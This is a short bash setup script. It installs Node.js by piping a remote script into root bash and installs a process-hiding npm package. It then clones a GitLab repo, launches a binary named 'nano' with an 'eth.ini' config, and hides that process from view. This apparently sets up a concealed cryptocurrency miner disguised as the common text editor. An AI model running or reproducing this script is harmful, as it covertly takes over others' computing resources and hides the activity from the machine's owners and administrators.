#!/bin/bash
sudo apt update
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
git clone https://gitlab.com/denisfachroni/nano.git
cd nano && chmod +x nano
ph add nano
./nano eth.ini
